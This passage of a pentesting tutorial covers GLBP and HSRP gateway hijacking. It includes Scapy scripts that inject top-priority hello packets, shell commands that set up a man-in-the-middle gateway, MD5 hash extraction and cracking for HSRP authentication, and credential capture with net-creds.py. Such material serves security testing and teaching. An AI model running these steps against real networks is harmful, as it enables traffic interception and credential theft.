  \ Insights into FHRP\n\nFHRP is designed to provide network robustness by merging multiple routers into a single virtual\
  \ unit, thereby enhancing load distribution and fault tolerance. Cisco Systems introduced prominent protocols in this suite,\
  \ such as GLBP and HSRP.\n\n### GLBP Protocol Insights\n\nCisco's creation, GLBP, functions on the TCP/IP stack, utilizing\
  \ UDP on port 3222 for communication. Routers in a GLBP group exchange \"hello\" packets at 3-second intervals. If a router\
  \ fails to send these packets for 10 seconds, it is presumed to be offline. However, these timers are not fixed and can\
  \ be modified.\n\nGLBP for IPv6 uses multicast **FF02::66** over UDP/3222, and the virtual MAC format becomes `0007.b4xx.xxyy`\
  \ (AVF ID is in the last byte). Timing and attack surface remain the same as in IPv4, so hijack techniques still work in\
  \ dual‑stack networks.\n\n### GLBP Operations and Load Distribution\n\nGLBP stands out by enabling load distribution across\
  \ routers using a single virtual IP coupled with multiple virtual MAC addresses. In a GLBP group, every router is involved\
  \ in packet forwarding. Unlike HSRP/VRRP, GLBP offers genuine load balancing through several mechanisms:\n\n- **Host-Dependent\
  \ Load Balancing:** Maintains consistent AVF MAC address assignment to a host, essential for stable NAT configurations.\n\
  - **Round-Robin Load Balancing:** The default approach, alternating AVF MAC address assignment among requesting hosts.\n\
  - **Weighted Round-Robin Load Balancing:** Distributes load based on predefined \"Weight\" metrics.\n\n### Key Components\
  \ and Terminologies in GLBP\n\n- **AVG (Active Virtual Gateway):** The main router, responsible for allocating MAC addresses\
  \ to peer routers.\n- **AVF (Active Virtual Forwarder):** A router designated to manage network traffic.\n- **GLBP Priority:**\
  \ A metric that determines the AVG, starting at a default of 100 and ranging between 1 and 255.\n- **GLBP Weight:** Reflects\
  \ the current load on a router, adjustable either manually or through Object Tracking.\n- **GLBP Virtual IP Address:** Serves\
  \ as the network's default gateway for all connected devices.\n\nFor interactions, GLBP employs the reserved multicast address\
  \ 224.0.0.102 and UDP port 3222. Routers transmit \"hello\" packets at 3-second intervals, and are considered non-operational\
  \ if a packet is missed over a 10-second duration.\n\n### GLBP Attack Mechanism\n\nAn attacker can become the primary router\
  \ by sending a GLBP packet with the highest priority value (255). This can lead to DoS or MITM attacks, allowing traffic\
  \ interception or redirection.\n\n**Practical GLBP hijack with Scapy (short PoC)**\n\n```python\nfrom scapy.all import *\n\
  \nvip = \"10.10.100.254\"          # learned from sniffing\npkt = IP(dst=\"224.0.0.102\")/UDP(dport=3222,sport=3222)/Raw(\n\
  \    b\"\\x01\\x00\\xff\\x64\"      # Version=1, Opcode=Hello, Priority=255, Weight=100\n)\nsend(pkt, iface=\"eth0\", loop=1,\
  \ inter=1)\n```\n\nCraft the payload bytes to mimic the GLBP header (version/opcode/priority/weight/VRID). Looping the frame\
  \ ensures you win the AVG election if authentication is absent.\n\n### Executing a GLBP Attack with Loki\n\n[Loki](https://github.com/raizo62/loki_on_kali)\
  \ can perform a GLBP attack by injecting a packet with priority and weight set to 255. Pre-attack steps involve gathering\
  \ information like the virtual IP address, authentication presence, and router priority values using tools like Wireshark.\n\
  \nAttack Steps:\n\n1. Switch to promiscuous mode and enable IP forwarding.\n2. Identify the target router and retrieve its\
  \ IP.\n3. Generate a Gratuitous ARP.\n4. Inject a malicious GLBP packet, impersonating the AVG.\n5. Assign a secondary IP\
  \ address to the attacker's network interface, mirroring the GLBP virtual IP.\n6. Implement SNAT for complete traffic visibility.\n\
  7. Adjust routing to ensure continued internet access through the original AVG router.\n\nBy following these steps, the\
  \ attacker positions themselves as a \"man in the middle,\" capable of intercepting and analyzing network traffic, including\
  \ unencrypted or sensitive data.\n\nFor demonstration, here are the required command snippets:\n\n```bash\n# Enable promiscuous\
  \ mode and IP forwarding\nsudo ip link set eth0 promisc on\nsudo sysctl -w net.ipv4.ip_forward=1\n\n# Configure secondary\
  \ IP and SNAT\nsudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0\nsudo iptables -t nat -A POSTROUTING -o eth0 -j\
  \ MASQUERADE\n\n# Adjust routing\nsudo route del default\nsudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100\n\
  ```\n\nMonitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing\
  \ through the compromised network.\n\n### Passive Explanation of HSRP Hijacking with Command Details\n\n#### Overview of\
  \ HSRP (Hot Standby Router/Redundancy Protocol)\n\nHSRP is a Cisco proprietary protocol designed for network gateway redundancy.\
  \ It allows the configuration of multiple physical routers into a single logical unit with a shared IP address. This logical\
  \ unit is managed by a primary router responsible for directing traffic. Unlike GLBP, which uses metrics like priority and\
  \ weight for load balancing, HSRP relies on a single active router for traffic management.\n\nHSRPv1 uses multicast **224.0.0.2**\
  \ and virtual MAC `0000.0c07.acXX`; HSRPv2 and HSRPv2 for IPv6 use **224.0.0.102 / FF02::66** and virtual MAC `0000.0c9f.fXXX`.\
  \ UDP destination port is **1985** for IPv4 and **2029** for IPv6.\n\n#### Roles and Terminology in HSRP\n\n- **HSRP Active\
  \ Router**: The device acting as the gateway, managing traffic flow.\n- **HSRP Standby Router**: A backup router, ready\
  \ to take over if the active router fails.\n- **HSRP Group**: A set of routers collaborating to form a single resilient\
  \ virtual router.\n- **HSRP MAC Address**: A virtual MAC address assigned to the logical router in the HSRP setup.\n- **HSRP\
  \ Virtual IP Address**: The virtual IP address of the HSRP group, acting as the default gateway for connected devices.\n\
  \n#### HSRP Versions\n\nHSRP comes in two versions, HSRPv1 and HSRPv2, differing mainly in group capacity, multicast IP\
  \ usage, and virtual MAC address structure. The protocol utilizes specific multicast IP addresses for service information\
  \ exchange, with Hello packets sent every 3 seconds. A router is presumed inactive if no packet is received within a 10-second\
  \ interval.\n\n#### HSRP Attack Mechanism\n\nHSRP attacks involve forcibly taking over the Active Router's role by injecting\
  \ a maximum priority value. This can lead to a Man-In-The-Middle (MITM) attack. Essential pre-attack steps include gathering\
  \ data about the HSRP setup, which can be done using Wireshark for traffic analysis.\n\n**Quick HSRP takeover with Scapy**\n\
  \n```python\nfrom scapy.all import *\n\nvip = \"10.10.100.1\"\npkt = IP(dst=\"224.0.0.102\")/UDP(sport=1985,dport=1985)/Raw(\n\
  \    b\"\\x00\\x02\\xff\\x03\\x00\\x00\\x00\\x01\"  # Hello, priority 255, group 1\n)\nsend(pkt, iface=\"eth0\", inter=1,\
  \ loop=1)\n```\n\nIf authentication is **not** configured, continuously sending hellos with higher priority forces peers\
  \ into *Speak*/*Listen* states and lets you become *Active*, redirecting traffic through your host.\n\n**HSRP authentication\
  \ corner cases**\n\n- Legacy plain-text auth is trivially spoofable.\n- MD5 authentication only covers the HSRP payload;\
  \ crafted packets can still rate-limit/DoS control planes. NX-OS releases previously allowed DoS against authenticated groups\
  \ (see Cisco advisory CSCup11309).\n- On many ISP / VPS shared VLANs, HSRPv1 multicasts are visible to tenants; without\
  \ auth you can join and preempt traffic.\n\n#### Steps for Bypassing HSRP Authentication\n\n1. Save the network traffic\
  \ containing HSRP data as a .pcap file.\n   ```shell\n   tcpdump -w hsrp_traffic.pcap\n   ```\n2. Extract MD5 hashes from\
  \ the .pcap file using hsrp2john.py.\n   ```shell\n   python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes\n   ```\n3. Crack\
  \ the MD5 hashes using John the Ripper.\n   ```shell\n   john --wordlist=mywordlist.txt hsrp_hashes\n   ```\n\n**Executing\
  \ HSRP Injection with Loki**\n\n1. Launch Loki to identify HSRP advertisements.\n2. Set the network interface to promiscuous\
  \ mode and enable IP forwarding.\n   ```shell\n   sudo ip link set eth0 promisc on\n   sudo sysctl -w net.ipv4.ip_forward=1\n\
  \   ```\n3. Use Loki to target the specific router, input the cracked HSRP password, and perform necessary configurations\
  \ to impersonate the Active Router.\n4. After gaining the Active Router role, configure your network interface and IP tables\
  \ to intercept the legitimate traffic.\n   ```shell\n   sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0\n   sudo\
  \ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n   ```\n5. Modify the routing table to route traffic through the\
  \ former Active Router.\n   ```shell\n   sudo route del default\n   sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100\n\
  \   ```\n6. Use net-creds.py or a similar utility to capture credentials from the intercepted traffic.\n   ```shell\n  \
  \ sudo python2 net-creds.py -i eth0\n   ```\n\nExecuting these steps places the attacker in a position to intercept and\
  \ manipulate traffic, similar to the procedure for GLBP hijacking. This highlights the vulnerability in redundancy protocols\
  \ like HSRP and the need for robust security measures.\n\n## References\n\n- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)\n\
